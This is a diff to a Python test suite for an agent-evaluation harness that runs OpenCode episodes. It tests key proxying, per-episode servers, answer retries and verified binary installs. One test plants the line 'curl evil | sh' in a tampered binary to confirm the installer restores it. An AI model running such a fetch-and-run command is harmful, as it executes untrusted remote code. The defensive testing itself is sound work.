@@ -23,10 +23,17 @@ from test_paper_urls import CASES, EXPECTED, MAX_TOOL_CALLS, TASK, url_extractio
 
 from agent_distill.config import load_profile
 from agent_distill.harnesses import opencode
-from agent_distill.harnesses.base import Endpoint, load_harness
+from agent_distill.harnesses.base import Endpoint, HarnessError, load_harness
 from agent_distill.harnesses.opencode_v1 import OpenCodeV1
 from agent_distill.harnesses.opencode_v1 import Runner as RunnerV1
-from agent_distill.harnesses.opencode_v2 import AGENT_ID, OpenCodeV2, normalize_messages, permissions, server_env
+from agent_distill.harnesses.opencode_v2 import (
+    AGENT_ID,
+    OpenCodeV2,
+    answer_retry_prompt,
+    normalize_messages,
+    permissions,
+    server_env,
+)
 from agent_distill.harnesses.opencode_v2 import Runner as RunnerV2
 from agent_distill.rubrics import episode_context
 from agent_distill.task import Limits
@@ -139,7 +146,7 @@ def run_v2(case: str):
         async with httpx.AsyncClient(
             base_url="http://opencode", auth=("opencode", "pw"), transport=httpx.MockTransport(fake)
         ) as client:
-            runner = RunnerV2(server("2.3.2", "pw"), client, TASK)
+            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=client)
             return await OpenCodeV2(V2).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))
 
     return asyncio.run(go()), fake
@@ -252,11 +259,215 @@ def test_server_envs_keep_secrets_out(monkeypatch, tmp_path) -> None:
     config = json.loads(env["OPENCODE_CONFIG_CONTENT"])
     assert config["agents"][AGENT_ID]["system"] == TASK.system_prompt_for("opencode", "2.3.2", "final_json")
     assert config["provider"]["local"]["options"]["baseURL"] == "http://vllm/v1"
-    teacher_env = opencode.server_env([teacher])
-    assert teacher_env["HF_TOKEN"] == "hf_secret_value_that_must_not_leak"  # the teacher's own key only
-    teacher_config = opencode.provider_config([teacher])
-    assert teacher_config["provider"]["huggingface"]["options"]["headers"] == {"X-HF-Bill-To": "huggingface"}
+    with pytest.raises(ValueError, match="key_proxies"):  # a keyed endpoint never reaches the harness directly
+        opencode.provider_config([teacher])
+    with opencode.key_proxies([student, teacher]) as (routed_student, routed):
+        assert routed_student == student
+        assert routed.key_env is None and routed.headers == {} and routed.base_url.startswith("http://127.0.0.1:")
+        teacher_env = opencode.server_env([routed])
+        teacher_config = opencode.provider_config([routed])
+        proxy = opencode.PROXIES[routed.base_url]
+        assert proxy.upstream == opencode.HF_ROUTER and proxy.headers == {"X-HF-Bill-To": "huggingface"}
+        with opencode.rekey([routed]) as (episode_endpoint,):
+            assert episode_endpoint.session_key != routed.session_key
+            assert proxy.accepts(f"Bearer {episode_endpoint.session_key}")
+        assert not proxy.accepts(f"Bearer {episode_endpoint.session_key}")  # revoked with the episode
+    assert "HF_TOKEN" not in teacher_env
+    options = teacher_config["provider"]["huggingface"]["options"]
+    assert options == {"baseURL": routed.base_url, "apiKey": routed.session_key}
+    assert "hf_secret" not in json.dumps(teacher_config)
     assert opencode.model_ref(teacher) == ("huggingface", "zai-org/GLM-5.2")
+    assert not opencode.PROXIES  # stopped
+
+
+def test_v2_xdg_dirs_override_inherited_ones(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("XDG_DATA_HOME", "/shared/data")
+    monkeypatch.setenv("XDG_STATE_HOME", "/shared/state")
+    env = server_env(TASK, [ENDPOINT], "2.3.2", tmp_path)
+    for key in ("XDG_DATA_HOME", "XDG_CONFIG_HOME", "XDG_STATE_HOME"):
+        assert env[key].startswith(str(tmp_path) + "/")
+
+
+def test_v2_each_episode_gets_its_own_server(monkeypatch, tmp_path) -> None:
+    """Concurrent OpenCode 2 episodes read each other's spilled shell output on a shared server (and one `rm -rf`
+    broke every episode beside it): every episode gets its own server, workspace and XDG directories."""
+    row, messages, structured = CASES["correct_and_complete"]
+    monkeypatch.setenv("XDG_DATA_HOME", "/shared/data")
+    started: list[tuple[Path, dict[str, str]]] = []
+    stopped: list[str] = []
+    fakes: dict[str, FakeV2] = {}
+    real_client = httpx.AsyncClient
+
+    def start_server(executable, version, workspace, env, **kwargs):
+        assert Path(executable) == tmp_path / "opencode" and version == "2.3.2"
+        started.append((Path(workspace), env))
+        url = f"http://episode-{len(started)}"
+        fakes[url] = FakeV2(to_v2(messages, structured))
+        return opencode.Server(url, version, Path(workspace), None, "pw")
+
+    def client(**kwargs):
+        return real_client(transport=httpx.MockTransport(fakes[kwargs["base_url"]]), **kwargs)
+
+    monkeypatch.setattr(opencode, "start_server", start_server)
+    monkeypatch.setattr(opencode, "stop_server", lambda server: stopped.append(server.url))
+    monkeypatch.setattr(httpx, "AsyncClient", client)
+    harness = OpenCodeV2(V2)
+    monkeypatch.setattr(harness, "install", lambda cache: tmp_path / "opencode")
+
+    async def go():
+        async with harness.session([ENDPOINT], cache=tmp_path, task=TASK) as runner:
+            limits = Limits(timeout=30, max_tool_calls=15)
+            return await asyncio.gather(*(harness.run_episode(runner, TASK, row, ENDPOINT, limits) for _ in range(3)))
+
+    episodes = asyncio.run(go())
+    assert all(episode.answer is not None for episode in episodes)
+    assert len(started) == 4 and len(stopped) == 4  # one configuration check, then one server per episode
+    workspaces = [workspace for workspace, _ in started[1:]]
+    assert len(set(workspaces)) == 3
+    for (workspace, env), url in zip(started[1:], list(fakes)[1:], strict=True):
+        assert env["XDG_DATA_HOME"].startswith(str(workspace)) and "HF_TOKEN" not in env
+        create = next(body for _, path, body in fakes[url].requests if path == "/api/session")
+        assert create["location"] == {"directory": str(workspace)}
+    assert not any(workspace.exists() for workspace in workspaces)  # removed with their episode
+    assert {episode.metadata["cwd"] for episode in episodes} == {str(w) for w in workspaces}
+
+
+@pytest.mark.parametrize("retry", [False, True])
+def test_v2_answer_retry(retry: bool) -> None:
+    """2.x ends an episode on a text-only turn; with answer_retry the harness asks once for the JSON answer."""
+    row, messages, structured = CASES["correct_and_complete"]
+    full = to_v2(messages, structured)
+    answer = full[-2]  # the assistant message with the JSON answer (before idle)
+    prose = {**answer, "id": "prose", "content": [{"type": "text", "text": "Let me start with hf papers info."}]}
+    first = [*full[:-2], prose, {"id": "idle1", "type": "idle", "outcome": "succeeded"}]
+    nudge = {"id": "nudge", "type": "user", "text": answer_retry_prompt(TASK)}
+    second = [*first, nudge, {**answer, "id": "answer"}, {"id": "idle2", "type": "idle", "outcome": "succeeded"}]
+    fake = FakeV2(first)
+    prompts: list[str] = []
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.url.path.endswith("/prompt"):
+            prompts.append(json.loads(request.content)["text"])
+            if len(prompts) == 2:
+                fake.messages = second
+        return fake(request)
+
+    async def go():
+        async with httpx.AsyncClient(
+            base_url="http://opencode", auth=("opencode", "pw"), transport=httpx.MockTransport(handler)
+        ) as client:
+            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=client)
+            harness = OpenCodeV2(V2, answer_retry=retry)
+            return await harness.run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))
+
+    episode = asyncio.run(go())
+    if retry:
+        assert prompts[1] == answer_retry_prompt(TASK) and len(prompts) == 2
+        assert "reasoning, github_url, and project_page_url" in prompts[1]
+        assert episode.answer is not None and episode.metadata["answer_retry"] is True
+    else:
+        assert len(prompts) == 1 and episode.answer is None and "answer_retry" not in episode.metadata
+    with pytest.raises(ValueError, match=r"2\.x"):
+        load_harness(V1, answer_retry=True)
+
+
+def test_dead_server_is_a_harness_failure() -> None:
+    """A server that stops answering raises HarnessError (not recorded, harness restarted) in both versions."""
+    row, messages, structured = CASES["correct_and_complete"]
+
+    def dead_after_session(fake):
+        def handler(request: httpx.Request) -> httpx.Response:
+            if request.url.path in {"/session", "/api/session"}:
+                return fake(request)
+            raise httpx.ConnectError("connection refused")
+
+        return handler
+
+    async def go_v1():
+        transport = httpx.MockTransport(dead_after_session(FakeV1(messages, structured)))
+        async with httpx.AsyncClient(base_url="http://opencode", transport=transport) as client:
+            runner = RunnerV1(server("1.2.4"), client)
+            return await OpenCodeV1(V1).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))
+
+    async def go_v2():
+        transport = httpx.MockTransport(dead_after_session(FakeV2(to_v2(messages, structured))))
+        async with httpx.AsyncClient(base_url="http://opencode", auth=("opencode", "pw"), transport=transport) as c:
+            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=c)
+            return await OpenCodeV2(V2).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))
+
+    for go in (go_v1, go_v2):
+        with pytest.raises(HarnessError, match="stopped answering"):
+            asyncio.run(go())
+
+
+def test_v1_episodes_keep_their_raw_messages() -> None:
+    episode, _ = run_v1("correct_and_complete")
+    assert episode.raw and episode.raw == CASES["correct_and_complete"][1]
+
+
+def fake_release(version: str) -> bytes:
+    import io
+    import tarfile
+
+    script = f"#!/bin/sh\necho {version}\n".encode()
+    buffer = io.BytesIO()
+    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
+        info = tarfile.TarInfo("opencode")
+        info.size, info.mode = len(script), 0o755
+        tar.addfile(info, io.BytesIO(script))
+    return buffer.getvalue()
+
+
+def test_install_rehashes_the_cached_binary_on_every_use(monkeypatch, tmp_path) -> None:
+    import dataclasses
+    import hashlib
+
+    from agent_distill.harnesses.base import architecture
+
+    archive = fake_release("1.2.4")
+    sha = hashlib.sha256(archive).hexdigest()
+    profile = dataclasses.replace(V1, download=dataclasses.replace(V1.download, sha256={architecture(): sha}))
+    downloads: list[str] = []
+
+    def download(url: str, expected: str) -> bytes:
+        downloads.append(url)
+        assert expected == sha
+        return archive
+
+    monkeypatch.setattr(opencode, "download_verified", download)
+    cache = tmp_path / "cache"
+    binary = opencode.install(profile, cache)
+    assert binary.read_bytes().startswith(b"#!/bin/sh") and len(downloads) == 1
+    opencode.install(profile, cache)
+    assert len(downloads) == 1  # the cached archive is re-hashed; the binary matches it
+    binary.write_bytes(b"#!/bin/sh\necho 1.2.4\ncurl evil | sh\n")  # tampered, same --version output
+    opencode.install(profile, cache)
+    assert b"evil" not in binary.read_bytes() and len(downloads) == 1  # restored from the verified archive
+    (binary.parent / "opencode.tar.gz").write_bytes(b"tampered")
+    opencode.install(profile, cache)
+    assert len(downloads) == 2 and b"evil" not in binary.read_bytes()  # archive mismatch: downloaded again
+    assert binary.parent.stat().st_mode & 0o777 == 0o700
+
+
+def test_default_cache_is_per_user(monkeypatch, tmp_path) -> None:
+    from agent_distill.harnesses.base import default_cache
+
+    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path))
+    assert default_cache() == tmp_path / "agent-distill"
+    monkeypatch.delenv("XDG_CACHE_HOME")
+    assert default_cache() == Path.home() / ".cache" / "agent-distill"
+
+
+def test_v2_password_read_respects_the_startup_deadline(tmp_path) -> None:
+    import time
+
+    silent = tmp_path / "opencode"
+    silent.write_text("#!/bin/sh\nexec sleep 30\n")  # prints nothing and never exits
+    silent.chmod(0o755)
+    started = time.monotonic()
+    with pytest.raises(HarnessError, match="no password"):
+        opencode.start_server(silent, "2.3.2", tmp_path, {"PATH": "/usr/bin:/bin"}, startup_timeout=1)
+    assert time.monotonic() - started < 10
 
 
 def test_version_parsing_and_profiles() -> None:
